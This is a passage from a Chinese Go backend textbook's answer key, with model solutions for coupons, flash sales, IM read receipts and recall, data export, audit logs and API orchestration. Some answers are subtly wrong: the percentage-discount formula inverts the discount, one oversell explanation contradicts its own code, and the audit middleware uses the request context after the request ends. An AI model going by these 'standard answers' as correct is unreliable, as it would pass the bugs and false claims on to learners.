- 高亮时的 `highlightSnippet` 不是简单的全量替换，而是提取关键词周边上下文，类似搜索引擎的摘要片段。

**改值实验**：
- **搜索 `+golang -python`（布尔语法）**：只返回包含 golang 且不包含 python 的文章。`IN BOOLEAN MODE` 支持此语法，而 `NATURAL LANGUAGE MODE` 不支持。若用错了模式，`+` 和 `-` 会被当作普通字符。
- **搜索一个非常短的词如 `a`**：MySQL FULLTEXT 默认忽略长度 < 3（innodb_ft_min_token_size=3）的词，结果为空。这是全文本索引的默认行为，不是 bug。解决方案：调整 `innodb_ft_min_token_size` 并重建索引。

---

## 第112章 · 项目电商系统

### K-112-P1 为电商系统增加优惠券功能

**标准答案**：

**1. DDL**：

```sql
CREATE TABLE coupons (
    id           BIGINT AUTO_INCREMENT PRIMARY KEY,
    name         VARCHAR(100) NOT NULL COMMENT '券名',
    type         ENUM('full_reduce','discount') NOT NULL COMMENT '满减/折扣',
    threshold    DECIMAL(10,2) NOT NULL DEFAULT 0 COMMENT '门槛金额',
    face_value   DECIMAL(10,2) NOT NULL COMMENT '面值/折扣率',
    total_stock  INT NOT NULL COMMENT '总库存',
    used_count   INT NOT NULL DEFAULT 0 COMMENT '已领取数',
    start_time   TIMESTAMP NOT NULL,
    end_time     TIMESTAMP NOT NULL,
    created_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE user_coupons (
    id         BIGINT AUTO_INCREMENT PRIMARY KEY,
    user_id    BIGINT NOT NULL,
    coupon_id  BIGINT NOT NULL,
    status     ENUM('unused','used','expired') NOT NULL DEFAULT 'unused',
    used_order_id BIGINT NULL COMMENT '使用的订单ID',
    obtained_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    used_at    TIMESTAMP NULL,
    INDEX idx_user_status (user_id, status),
    FOREIGN KEY (coupon_id) REFERENCES coupons(id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

**2. 用户领券接口**：

```go
// POST /api/v1/coupons/:id/claim
func ClaimCoupon(c *gin.Context) {
    userID := c.GetInt64("user_id")
    couponID, _ := strconv.ParseInt(c.Param("id"), 10, 64)

    err := db.Transaction(func(tx *gorm.DB) error {
        // 悲观锁读取优惠券，防止超领
        var coupon Coupon
        if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
            First(&coupon, couponID).Error; err != nil {
            return fmt.Errorf("优惠券不存在")
        }

        if time.Now().Before(coupon.StartTime) || time.Now().After(coupon.EndTime) {
            return fmt.Errorf("不在有效期内")
        }

        if coupon.UsedCount >= coupon.TotalStock {
            return fmt.Errorf("优惠券已领完")
        }

        // 检查是否已领取
        var count int64
        tx.Model(&UserCoupon{}).
            Where("user_id = ? AND coupon_id = ?", userID, couponID).Count(&count)
        if count > 0 {
            return fmt.Errorf("已领取过该优惠券")
        }

        // 扣减库存
        tx.Model(&Coupon{}).Where("id = ?", couponID).
            UpdateColumn("used_count", gorm.Expr("used_count + 1"))

        // 发放
        tx.Create(&UserCoupon{UserID: userID, CouponID: couponID})
        return nil
    })

    if err != nil {
        c.JSON(400, gin.H{"error": err.Error()})
        return
    }
    c.JSON(200, gin.H{"message": "领取成功"})
}
```

**3. 下单使用优惠券校验**：

```go
func validateCoupon(tx *gorm.DB, userCouponID int64, userID int64, orderAmount float64) (*Coupon, error) {
    var uc UserCoupon
    if err := tx.Where("id = ? AND user_id = ? AND status = 'unused'", userCouponID, userID).
        First(&uc).Error; err != nil {
        return nil, fmt.Errorf("优惠券无效或已使用")
    }

    var coupon Coupon
    tx.First(&coupon, uc.CouponID)

    if time.Now().After(coupon.EndTime) {
        return nil, fmt.Errorf("优惠券已过期")
    }

    if orderAmount < coupon.Threshold {
        return nil, fmt.Errorf("未达到使用门槛 %.2f 元", coupon.Threshold)
    }

    return &coupon, nil
}

func calculateDiscount(coupon *Coupon, amount float64) float64 {
    switch coupon.Type {
    case "full_reduce":
        return coupon.FaceValue
    case "discount":
        return amount * coupon.FaceValue / 100 // face_value 存储折扣率如 80 表示 8 折
    default:
        return 0
    }
}
```

**4. 查询可用优惠券**：

```go
// GET /api/v1/coupons/available?amount=200
func AvailableCoupons(c *gin.Context) {
    userID := c.GetInt64("user_id")
    amount, _ := strconv.ParseFloat(c.DefaultQuery("amount", "0"), 64)

    var coupons []Coupon
    db.Raw(`
        SELECT c.* FROM coupons c
        JOIN user_coupons uc ON uc.coupon_id = c.id
        WHERE uc.user_id = ?
          AND uc.status = 'unused'
          AND c.start_time <= NOW() AND c.end_time >= NOW()
          AND c.threshold <= ?
    `, userID, amount).Scan(&coupons)

    c.JSON(200, coupons)
}
```

**解析**：
- **悲观锁** `clause.Locking{Strength: "UPDATE"}`：在领券时对优惠券行加排他锁，防止超领。高并发下悲观锁性能较差，可改用乐观锁（version 字段）或 Redis 扣库存。
- 校验顺序：先查记录 → 有效期 → 库存 → 重复 → 扣库存 + 发券。每一步都在事务内，保证原子性。
- 优惠率用整数存储：`80` 代表 8 折，避免浮点精度问题。

**改值实验**：
- **两个用户同时领取最后一张券**：事务 A 先拿到 `SELECT ... FOR UPDATE` 的行锁，事务 B 等待。A 领取成功并释放锁，B 再读时发现 `UsedCount >= TotalStock`，返回"已领完"。若无悲观锁，两人都能领到，导致超发。
- **把 `end_time` 设为过去时间但改数据库跳过 NOW() 检查**：用户可用券列表仍为空，因为 SQL 中 `c.end_time >= NOW()` 会过滤掉过期券。如果代码中有缓存层没刷新，可能出现"缓存中有券但数据库已过期"的不一致。

---

### K-112-P2 秒杀活动 ⭐

**标准答案**：

**1. DDL**：

```sql
CREATE TABLE seckill_activities (
    id          BIGINT AUTO_INCREMENT PRIMARY KEY,
    name        VARCHAR(100) NOT NULL,
    start_time  TIMESTAMP NOT NULL,
    end_time    TIMESTAMP NOT NULL,
    status      ENUM('pending','active','finished') DEFAULT 'pending'
);

CREATE TABLE seckill_products (
    id           BIGINT AUTO_INCREMENT PRIMARY KEY,
    activity_id  BIGINT NOT NULL,
    product_id   BIGINT NOT NULL,
    seckill_price DECIMAL(10,2) NOT NULL,
    stock        INT NOT NULL COMMENT '秒杀库存',
    sold_count   INT NOT NULL DEFAULT 0,
    FOREIGN KEY (activity_id) REFERENCES seckill_activities(id)
);
```

**2. Redis 预减库存 + 异步下单**：

```go
func SeckillHandler(c *gin.Context) {
    userID := c.GetInt64("user_id")
    activityID, _ := strconv.ParseInt(c.Param("activity_id"), 10, 64)
    productID, _ := strconv.ParseInt(c.Param("product_id"), 10, 64)

    // 1. Redis 限流：同一用户 1 秒内只能请求 1 次
    rateKey := fmt.Sprintf("seckill:rate:%d:%d", activityID, userID)
    if ok, _ := redisClient.SetNX(ctx, rateKey, 1, 1*time.Second).Result(); !ok {
        c.JSON(429, gin.H{"error": "请勿频繁请求"})
        return
    }

    // 2. Redis 预减库存
    stockKey := fmt.Sprintf("seckill:stock:%d:%d", activityID, productID)
    stock, _ := redisClient.Decr(ctx, stockKey).Result()
    if stock < 0 {
        redisClient.Incr(ctx, stockKey) // 回滚
        c.JSON(400, gin.H{"error": "已售罄"})
        return
    }

    // 3. 异步下单（发送到消息队列）
    orderMsg := SeckillOrderMessage{
        UserID:     userID,
        ActivityID: activityID,
        ProductID:  productID,
        Timestamp:  time.Now().Unix(),
    }
    msgBytes, _ := json.Marshal(orderMsg)
    rabbitMQClient.Publish("seckill_orders", msgBytes)

    c.JSON(202, gin.H{"message": "排队中，请稍后查看订单"})
}

// 消费端：处理实际下单
func SeckillOrderConsumer(msg []byte) {
    var orderMsg SeckillOrderMessage
    json.Unmarshal(msg, &orderMsg)

    err := db.Transaction(func(tx *gorm.DB) error {
        // 数据库层面二次校验库存
        var sp SeckillProduct
        if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
            Where("activity_id = ? AND product_id = ?", orderMsg.ActivityID, orderMsg.ProductID).
            First(&sp).Error; err != nil {
            return err
        }
        if sp.SoldCount >= sp.Stock {
            return fmt.Errorf("库存不足")
        }
        tx.Model(&sp).UpdateColumn("sold_count", gorm.Expr("sold_count + 1"))

        // 创建订单
        order := Order{
            UserID:  orderMsg.UserID,
            ProductID: orderMsg.ProductID,
            Amount:  sp.SeckillPrice,
            Status:  "paid",
        }
        return tx.Create(&order).Error
    })

    if err != nil {
        redisClient.Incr(ctx, fmt.Sprintf("seckill:stock:%d:%d", orderMsg.ActivityID, orderMsg.ProductID))
        // 通知用户秒杀失败
    }
}
```

**3. 秒杀前活动预热**：

```go
// 活动开始前，将库存加载到 Redis
func PreloadSeckillStock(activityID int64) {
    var products []SeckillProduct
    db.Where("activity_id = ?", activityID).Find(&products)
    for _, p := range products {
        key := fmt.Sprintf("seckill:stock:%d:%d", activityID, p.ProductID)
        redisClient.Set(ctx, key, p.Stock, 0)
    }
}

// GET /api/v1/seckill/activities/:id — 返回活动信息 + 倒计时
func GetSeckillActivity(c *gin.Context) {
    var activity SeckillActivity
    db.First(&activity, c.Param("id"))

    countdown := activity.StartTime.Unix() - time.Now().Unix()
    if countdown < 0 {
        countdown = 0
    }

    var products []SeckillProduct
    db.Where("activity_id = ?", activity.ID).Find(&products)

    c.JSON(200, gin.H{
        "activity":  activity,
        "countdown": countdown,
        "products":  products,
    })
}
```

**解析**：
- **Redis Decr 原子性**：Redis 单线程模型保证 INCR/DECR 原子操作，不会超卖。但极端情况下（Redis 主从切换丢失数据），仍需数据库层面二次校验。
- **异步下单**：`202 Accepted` + 消息队列削峰，避免数据库压力过大。用户立即拿到"排队中"响应，不阻塞。
- **兜底回滚**：消费端处理失败时 `redisClient.Incr` 恢复 Redis 库存，防止"Redis 扣了但 DB 没下单"导致的假售罄。

**改值实验**：
- **去掉 Redis 限流**：同一用户在 1 秒内可发 1000 次请求，每次 Decr 都成功（Redis QPS 约 10 万），瞬间扣到负值。值 < 0 后的请求都被拒绝，但超卖数量可能高达库存的几十倍（取决于并发量）。
- **去掉数据库二次校验**：若 Redis 主从切换导致 Decr 回滚 100 条库存，消费端不加锁直接 `sold_count+1`，可能超卖 100 件。数据库悲观锁是最终一致性防线。

---

## 第113章 · 项目即时通讯

### K-113-P1 为 IM 系统增加消息已读/未读功能

**标准答案**：

**1. DDL**：

```sql
CREATE TABLE message_reads (
    id         BIGINT AUTO_INCREMENT PRIMARY KEY,
    message_id BIGINT NOT NULL,
    user_id    BIGINT NOT NULL,
    read_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_msg_user (message_id, user_id),
    INDEX idx_user_msg_read (user_id, message_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

**2. 单聊已读判断**：

```go
// 判断消息是否已被对方已读
func IsMessageRead(msgID int64, readerID int64) bool {
    var count int64
    db.Model(&MessageRead{}).Where("message_id = ? AND user_id = ?", msgID, readerID).Count(&count)
    return count > 0
}
```

**3. 群聊"已读人数"**：

```go
type MessageWithReadInfo struct {
    Message
    ReadCount    int64 `json:"read_count"`
    GroupMembers int64 `json:"group_members"`
}

func GetMessagesWithReadInfo(chatID int64, userID int64) []MessageWithReadInfo {
    var results []MessageWithReadInfo

    // 获取群成员总数（缓存到 Redis，避免每次查询）
    memberCount, _ := redisClient.Get(ctx, fmt.Sprintf("group:members:count:%d", chatID)).Int64()

    db.Raw(`
        SELECT m.*,
               COUNT(mr.id) AS read_count,
               ? AS group_members
        FROM messages m
        LEFT JOIN message_reads mr ON mr.message_id = m.id
        WHERE m.chat_id = ?
        GROUP BY m.id
        ORDER BY m.created_at
    `, memberCount, chatID).Scan(&results)

    return results
}
```

**4. 标记已读**：

```go
// POST /api/v1/messages/read — 标记已读
func MarkAsRead(c *gin.Context) {
    var req struct {
        MessageIDs []int64 `json:"message_ids" binding:"required,min=1"`
        ChatID     int64   `json:"chat_id" binding:"required"`
    }
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(400, gin.H{"error": err.Error()})
        return
    }

    userID := c.GetInt64("user_id")

    // 批量插入，忽略重复（已读过的跳过）
    reads := make([]MessageRead, 0, len(req.MessageIDs))
    for _, mid := range req.MessageIDs {
        reads = append(reads, MessageRead{MessageID: mid, UserID: userID})
    }
    db.Clauses(clause.OnConflict{DoNothing: true}).Create(&reads)

    // WebSocket 通知其他用户"已读"
    notifyReadStatus(req.ChatID, userID, req.MessageIDs)

    c.JSON(200, gin.H{"message": "ok"})
}

// 查询未读消息数
// GET /api/v1/messages/unread-count?chat_id=1
func UnreadCount(c *gin.Context) {
    chatID, _ := strconv.ParseInt(c.Query("chat_id"), 10, 64)
    userID := c.GetInt64("user_id")

    var count int64
    db.Raw(`
        SELECT COUNT(*)
        FROM messages m
        WHERE m.chat_id = ?
          AND m.sender_id != ?
          AND NOT EXISTS (
              SELECT 1 FROM message_reads mr
              WHERE mr.message_id = m.id AND mr.user_id = ?
          )
    `, chatID, userID, userID).Scan(&count)

    c.JSON(200, gin.H{"count": count})
}
```

**5. WebSocket 消息格式**：

```json
// 服务端 → 客户端：消息已读通知
{
    "type": "read_receipt",
    "chat_id": 123,
    "reader_id": 456,
    "message_ids": [1001, 1002, 1003],
    "read_at": "2026-05-28T10:00:00Z"
}

// 群聊中显示已读人数
{
    "type": "read_count_update",
    "chat_id": 123,
    "message_id": 1001,
    "read_count": 5,
    "total_members": 20
}
```

**解析**：
- `clause.OnConflict{DoNothing: true}`：标记已读时忽略重复，避免"已标记 → 再次标记"报唯一键冲突。
- 未读消息数用 `NOT EXISTS` 子查询：比 LEFT JOIN + IS NULL 在某些 MySQL 版本中更高效，语义也更清晰。
- 群聊"已读人数"用 Redis 缓存群成员数，避免每次消息查询都 JOIN 用户表。

**改值实验**：
- **批量标记 10000 条消息已读**：`clause.OnConflict{DoNothing: true}` 结合批量 INSERT，10000 条只发一条 SQL，性能远优于逐条 INSERT。但如果单次插入量过大，可能超过 MySQL `max_allowed_packet` 限制。
- **查询未读数时不排除自己的消息**（去掉 `m.sender_id != ?`）：自己发的消息也会计入未读数。这显然不符合用户预期——没人需要"已读自己发的消息"。这个条件虽小但至关重要。

---

### K-113-P2 消息撤回功能 ⭐

**标准答案**：

```go
// POST /api/v1/messages/:id/recall
func RecallMessage(c *gin.Context) {
    msgID, _ := strconv.ParseInt(c.Param("id"), 10, 64)
    userID := c.GetInt64("user_id")

    err := db.Transaction(func(tx *gorm.DB) error {
        var msg Message
        if err := tx.First(&msg, msgID).Error; err != nil {
            return fmt.Errorf("消息不存在")
        }

        if msg.SenderID != userID {
            return fmt.Errorf("只能撤回自己的消息")
        }

        if time.Since(msg.CreatedAt) > 2*time.Minute {
            return fmt.Errorf("超过2分钟无法撤回")
        }

        // 检查是否已被任何人已读
        var readCount int64
        tx.Model(&MessageRead{}).Where("message_id = ?", msgID).Count(&readCount)

        if readCount > 0 {
            // 已读：软删除，保留"对方撤回了一条消息"提示
            tx.Model(&msg).UpdateColumns(map[string]interface{}{
                "is_recalled": true,
                "content":     "",
                "recalled_at": time.Now(),
            })
        } else {
            // 未读：硬删除，从聊天记录中完全移除
            tx.Delete(&msg)
        }

        return nil
    })

    if err != nil {
        c.JSON(400, gin.H{"error": err.Error()})
        return
    }

    // WebSocket 通知对方
    notifyRecall(msgID, userID)

    c.JSON(200, gin.H{"message": "撤回成功"})
}

// 消息模型中增加撤回字段
type Message struct {
    ID         int64     `json:"id" gorm:"primaryKey"`
    ChatID     int64     `json:"chat_id"`
    SenderID   int64     `json:"sender_id"`
    Content    string    `json:"content"`
    IsRecalled bool      `json:"is_recalled" gorm:"default:false"`
    RecalledAt *time.Time `json:"recalled_at"`
    CreatedAt  time.Time `json:"created_at"`
}

// 查询消息时处理已撤回的展示
func GetMessages(chatID int64, userID int64) []MessageVO {
    var msgs []Message
    db.Where("chat_id = ?", chatID).Find(&msgs)

    result := make([]MessageVO, 0, len(msgs))
    for _, msg := range msgs {
        vo := MessageVO{
            ID:         msg.ID,
            SenderID:   msg.SenderID,
            IsRecalled: msg.IsRecalled,
            CreatedAt:  msg.CreatedAt,
        }
        if msg.IsRecalled {
            vo.Content = "对方撤回了一条消息"
        } else {
            vo.Content = msg.Content
        }
        result = append(result, vo)
    }
    return result
}
```

WebSocket 撤回通知格式：
```json
{
    "type": "message_recall",
    "chat_id": 123,
    "message_id": 1001,
    "recalled_by": 456,
    "recalled_at": "2026-05-28T10:02:00Z",
    "had_read": true
}
```

**解析**：
- **"已读 → 软删除 / 未读 → 硬删除"**：这是产品体验决策。已读者已经看到内容，硬删除反而制造困惑。未读者没见过内容，完全移除痕迹更干净。
- 撤回时间限制在事务中校验：`time.Since(msg.CreatedAt)` 获取的是数据库时间（Go 端的 time），与 `msg.CreatedAt`（DB 写入时间）比较。若服务器时间不准可能有偏差，精确场景可用 `tx.NowFunc()` 统一时间源。
- 撤回后通过 WebSocket 实时推送：对方在线时立刻看到变化，离线时下次拉取消息时通过 `is_recalled` 字段判断展示。

**改值实验**：
- **把撤回时限从 2 分钟改为 5 秒**：绝大多数消息都无法撤回。时限越短越接近"真实对话体验"（说出去的话收不回），越长越方便用户。微信选择 2 分钟是平衡点。
- **改为"所有人已读后仍可硬删除"**：已读者会看到消息凭空消失，产生"我是不是看错了"的困惑。软删除保留提示是一种重要的 UX 设计——让用户知道"发生了什么"，而不只是"数据被删了"。

---

## 第114章 · 项目后台管理系统

### K-114-P1 为后台系统增加数据导出功能

**标准答案**：

**用户列表导出 Excel**：

```go
import "github.com/xuri/excelize/v2"

// GET /api/v1/admin/users/export?start=2026-01-01&end=2026-06-01
func ExportUsersExcel(c *gin.Context) {
    startTime := c.Query("start")
    endTime := c.Query("end")

    var users []User
    query := db.Model(&User{})
    if startTime != "" {
        query = query.Where("created_at >= ?", startTime)
    }
    if endTime != "" {
        query = query.Where("created_at <= ?", endTime)
    }
    query.Find(&users)

    f := excelize.NewFile()
    sheet := "用户列表"
    f.SetSheetName("Sheet1", sheet)

    // 表头
    headers := []string{"ID", "用户名", "邮箱", "角色", "注册时间"}
    for i, h := range headers {
        cell, _ := excelize.CoordinatesToCellName(i+1, 1)
        f.SetCellValue(sheet, cell, h)
    }

    // 表头样式
    headerStyle, _ := f.NewStyle(&excelize.Style{
        Font: &excelize.Font{Bold: true, Size: 12},
        Fill: excelize.Fill{Type: "pattern", Color: []string{"#D9E1F2"}, Pattern: 1},
    })
    f.SetCellStyle(sheet, "A1", "E1", headerStyle)

    // 数据行
    for i, user := range users {
        row := i + 2
        f.SetCellValue(sheet, fmt.Sprintf("A%d", row), user.ID)
        f.SetCellValue(sheet, fmt.Sprintf("B%d", row), user.Username)
        f.SetCellValue(sheet, fmt.Sprintf("C%d", row), user.Email)
        f.SetCellValue(sheet, fmt.Sprintf("D%d", row), user.Role)
        f.SetCellValue(sheet, fmt.Sprintf("E%d", row), user.CreatedAt.Format("2006-01-02 15:04"))
    }

    f.SetColWidth(sheet, "A", "E", 18)

    buf, _ := f.WriteToBuffer()
    filename := fmt.Sprintf("users_export_%s.xlsx", time.Now().Format("20060102_150405"))

    c.Header("Content-Type", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
    c.Header("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
    c.Data(200, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", buf.Bytes())
}
```

**订单列表导出 CSV**：

```go
// GET /api/v1/admin/orders/export
func ExportOrdersCSV(c *gin.Context) {
    var orders []Order
    query := db.Model(&Order{}).Preload("User")
    if start := c.Query("start"); start != "" {
        query = query.Where("created_at >= ?", start)
    }
    if end := c.Query("end"); end != "" {
        query = query.Where("created_at <= ?", end)
    }
    query.Find(&orders)

    var buf bytes.Buffer
    buf.WriteString("\xEF\xBB\xBF") // UTF-8 BOM，Excel 正确识别中文
    writer := csv.NewWriter(&buf)

    writer.Write([]string{"订单号", "用户", "金额", "状态", "创建时间"})
    for _, o := range orders {
        writer.Write([]string{
            strconv.FormatInt(o.ID, 10),
            o.User.Username,
            fmt.Sprintf("%.2f", o.Amount),
            o.Status,
            o.CreatedAt.Format("2006-01-02 15:04:05"),
        })
    }
    writer.Flush()

    filename := fmt.Sprintf("orders_export_%s.csv", time.Now().Format("20060102_150405"))
    c.Header("Content-Type", "text/csv; charset=utf-8")
    c.Header("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
    c.Data(200, "text/csv", buf.Bytes())
}
```

**大文件异步导出**：

```go
type ExportTask struct {
    ID        string    `json:"id" gorm:"primaryKey;size:36"`
    UserID    int64     `json:"user_id"`
    Type      string    `json:"type"`   // "users" / "orders"
    Status    string    `json:"status"` // "pending" / "processing" / "done" / "failed"
    FileURL   string    `json:"file_url"`
    CreatedAt time.Time `json:"created_at"`
}

// POST /api/v1/admin/export/async — 创建导出任务
func CreateExportTask(c *gin.Context) {
    var req struct {
        Type      string `json:"type" binding:"required,oneof=users orders"`
        StartTime string `json:"start_time"`
        EndTime   string `json:"end_time"`
    }
    if err := c.ShouldBindJSON(&req); err != nil {
        c.JSON(400, gin.H{"error": err.Error()})
        return
    }

    task := ExportTask{
        ID:     uuid.New().String(),
        UserID: c.GetInt64("user_id"),
        Type:   req.Type,
        Status: "pending",
    }
    db.Create(&task)

    // 推送到异步队列
    taskMsg, _ := json.Marshal(map[string]interface{}{
        "task_id":    task.ID,
        "type":       req.Type,
        "start_time": req.StartTime,
        "end_time":   req.EndTime,
    })
    rabbitMQClient.Publish("export_tasks", taskMsg)

    c.JSON(202, gin.H{"task_id": task.ID, "message": "导出任务已创建"})
}

// GET /api/v1/admin/export/tasks/:id — 轮询任务状态
func GetExportTaskStatus(c *gin.Context) {
    var task ExportTask
    db.First(&task, "id = ?", c.Param("id"))
    c.JSON(200, task)
}

// 消费者：执行导出并上传到 OSS
func ExportWorker(msg []byte) {
    var payload map[string]interface{}
    json.Unmarshal(msg, &payload)
    taskID := payload["task_id"].(string)

    db.Model(&ExportTask{}).Where("id = ?", taskID).Update("status", "processing")

    // 执行实际导出逻辑...
    fileBytes := doExport(payload["type"].(string), payload)

    // 上传到 OSS / MinIO，生成下载链接
    key := fmt.Sprintf("exports/%s/%s.xlsx", payload["type"], taskID)
    uploadToOSS(key, fileBytes)
    downloadURL := fmt.Sprintf("https://oss.example.com/%s?expires=86400", key)

    db.Model(&ExportTask{}).Where("id = ?", taskID).Updates(map[string]interface{}{
        "status":   "done",
        "file_url": downloadURL,
    })
}

// 定时清理过期文件：cron 每小时执行
func CleanupExpiredExports() {
    threshold := time.Now().Add(-24 * time.Hour)
    var tasks []ExportTask
    db.Where("status = 'done' AND created_at < ?", threshold).Find(&tasks)
    for _, t := range tasks {
        deleteFromOSS(fmt.Sprintf("exports/%s/%s.xlsx", t.Type, t.ID))
        db.Model(&t).Update("file_url", "")
    }
}
```

**解析**：
- **UTF-8 BOM** (`\xEF\xBB\xBF`)：CSV 文件需要 BOM 头才能让 Excel 正确识别中文编码，否则用 Excel 打开会乱码。
- **异步导出**：大文件导出耗时可能超过 HTTP 超时限制，用"任务 ID + 轮询"模式解耦请求和计算。
- **文件 24 小时过期**：cron 定时清理 OSS 文件，防止存储空间无限制增长。同时也保护数据安全——导出的用户数据不应长期存储在 OSS 上。

**改值实验**：
- **导出 100 万条用户数据到 Excel**：`excelize` 内存消耗会急剧上升（每行约 1KB）。解决方案：改用 `excelize.NewStreamWriter` 流式写入（内存占用固定，不受数据量影响），或强制走异步导出并在 Worker 中使用流式写入。
- **去掉 CSV 的 UTF-8 BOM**：用 Excel 打开 CSV 时中文显示为乱码。但用文本编辑器（VS Code / Notepad++）打开正常——因为编辑器默认假设 UTF-8，而 Excel 需要 BOM 来识别编码。

---

### K-114-P2 操作审计日志 ⭐

**标准答案**：

**1. DDL**：

```sql
CREATE TABLE audit_logs (
    id            BIGINT AUTO_INCREMENT PRIMARY KEY,
    operator_id   BIGINT NOT NULL COMMENT '操作人ID',
    operator_name VARCHAR(100) NOT NULL COMMENT '操作人姓名',
    action        VARCHAR(50) NOT NULL COMMENT 'CREATE/UPDATE/DELETE/EXPORT',
    target_type   VARCHAR(50) NOT NULL COMMENT '操作对象：user/role/permission',
    target_id     BIGINT COMMENT '操作对象ID',
    before_data   JSON COMMENT '操作前数据',
    after_data    JSON COMMENT '操作后数据',
    ip_address    VARCHAR(45) NOT NULL COMMENT '客户端IP',
    user_agent    VARCHAR(500) COMMENT 'User-Agent',
    created_at    TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_operator (operator_id),
    INDEX idx_action (action),
    INDEX idx_target (target_type, target_id),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

**2. 中间件实现**：

```go
func AuditMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        // 只记录危险操作
        if c.Request.Method == "GET" {
            c.Next()
            return
        }

        // 记录请求体（需要先读取再恢复，否则后续 handler 读不到）
        var reqBody []byte
        if c.Request.Body != nil {
            reqBody, _ = io.ReadAll(c.Request.Body)
            c.Request.Body = io.NopCloser(bytes.NewBuffer(reqBody))
        }

        // 捕获响应体
        blw := &bodyLogWriter{body: bytes.NewBufferString(""), ResponseWriter: c.Writer}
        c.Writer = blw

        c.Next()

        // 异步写入审计日志（不阻塞响应）
        go func() {
            log := AuditLog{
                OperatorID:   c.GetInt64("user_id"),
                OperatorName: c.GetString("username"),
                Action:       mapAction(c.Request.Method),
                TargetType:   extractTargetType(c.Request.URL.Path),
                TargetID:     extractTargetID(c.Request.URL.Path),
                BeforeData:   extractBeforeData(c),
                AfterData:    buildAfterData(reqBody, blw.body.Bytes()),
                IPAddress:    c.ClientIP(),
                UserAgent:    c.GetHeader("User-Agent"),
            }
            db.Create(&log)

            // 敏感操作告警
            if isSensitiveOperation(c.Request.URL.Path, c.Request.Method) {
                sendAlert(log)
            }
        }()
    }
}

type bodyLogWriter struct {
    gin.ResponseWriter
    body *bytes.Buffer
}

func (w *bodyLogWriter) Write(b []byte) (int, error) {
    w.body.Write(b)
    return w.ResponseWriter.Write(b)
}
```

**3. 搜索接口**：

```go
// GET /api/v1/admin/audit-logs?operator=admin&action=DELETE&start=2026-01-01&end=2026-06-01
func SearchAuditLogs(c *gin.Context) {
    var logs []AuditLog
    query := db.Model(&AuditLog{})

    if operator := c.Query("operator"); operator != "" {
        query = query.Where("operator_name LIKE ?", "%"+operator+"%")
    }
    if action := c.Query("action"); action != "" {
        query = query.Where("action = ?", action)
    }
    if targetType := c.Query("target_type"); targetType != "" {
        query = query.Where("target_type = ?", targetType)
    }
    if start := c.Query("start"); start != "" {
        query = query.Where("created_at >= ?", start)
    }
    if end := c.Query("end"); end != "" {
        query = query.Where("created_at <= ?", end)
    }

    query.Order("created_at DESC").Limit(200).Find(&logs)
    c.JSON(200, logs)
}
```

**4. 敏感操作告警**：

```go
func isSensitiveOperation(path string, method string) bool {
    sensitivePaths := map[string]bool{
        "/api/v1/admin/roles":      true,
        "/api/v1/admin/permissions": true,
    }
    return sensitivePaths[path] && (method == "PUT" || method == "DELETE")
}

func sendAlert(log AuditLog) {
    alert := fmt.Sprintf("[安全告警] %s 在 %s 执行了 %s %s (ID:%d)",
        log.OperatorName, log.IPAddress, log.Action, log.TargetType, log.TargetID)
    // 发送到钉钉/企微/Slack
    dingTalkClient.SendText(alert)
}
```

**解析**：
- **异步写入**：`go func()` 确保记录审计日志不会阻塞用户请求响应。代价是进程崩溃时可能丢失最后几条未写入的日志——对于非金融场景，这个权衡是合理的。
- **`bodyLogWriter`**：通过包装 `ResponseWriter` 来捕获响应体。注意必须同时写入原始 `ResponseWriter`，否则客户端收不到响应。
- **`io.NopCloser`**：读取 request body 后必须恢复，因为 Gin 的 `ShouldBindJSON` 会再次读取。这是 Gin 中间件的一个常见陷阱。
- **before/after 对比**：`before_data` 需要在 handler 执行前查询数据库获取（可扩展中间件逻辑），`after_data` 从请求体和响应体推断。

**改值实验**：
- **审计日志使用同步写入而非 `go func()`**：每个写操作的响应时间增加 ~5~20ms（数据库写入延迟）。低并发场景可接受，高并发场景会导致写操作的响应时间线性恶化。
- **不对 before_data 做 JSON 字段限制**（直接存整个对象）：单条日志可能从 2KB 膨胀到 200KB（如文章正文、富文本内容）。`JSON` 类型虽然灵活，但应只存关键字段（如仅存 ID + 名称，不存全文内容）。

---

## 第115章 · 项目微服务网关

### K-115-P1 为网关增加 API 编排功能

**标准答案**：

**核心配置结构**：

```go
type OrchestrationConfig struct {
    Routes map[string]*CompositeRoute `yaml:"routes"`
}

type CompositeRoute struct {
    Steps     []Step         `yaml:"steps"`
    Mode      string         `yaml:"mode"`      // "parallel" / "serial"
    Merge     MergeStrategy  `yaml:"merge"`
    Fallback  FallbackPolicy `yaml:"fallback"`
}

type Step struct {
    Name       string            `yaml:"name"`       // 聚合结果中的字段名
    Service    string            `yaml:"service"`    // 下游服务名
    Path       string            `yaml:"path"`       // 下游接口路径
    Method     string            `yaml:"method"`
    DependsOn  []string          `yaml:"depends_on"` // 串行模式的依赖
    Headers    map[string]string `yaml:"headers"`    // 透传的请求头
}

type MergeStrategy struct {
    Type  string   `yaml:"type"`  // "merge" / "pick"
    Fields []string `yaml:"fields"` // pick 模式下保留的字段
}

type FallbackPolicy struct {
    Type    string `yaml:"type"`    // "partial" / "fail_all"
    Default interface{} `yaml:"default"` // partial 模式下的默认值
}
```

**配置文件示例 (orchestration.yaml)**：

```yaml
routes:
  /api/v1/user-profile:
    mode: parallel
    merge:
      type: merge
    fallback:
      type: partial
      default: {}
    steps:
      - name: user_info
        service: user-service
        path: /api/internal/users/:user_id
        method: GET
      - name: recent_orders
        service: order-service
        path: /api/internal/orders/recent?user_id=:user_id
        method: GET
      - name: points
        service: point-service
        path: /api/internal/points/:user_id
        method: GET
```

**编排引擎核心代码**：

```go
type OrchestrationEngine struct {
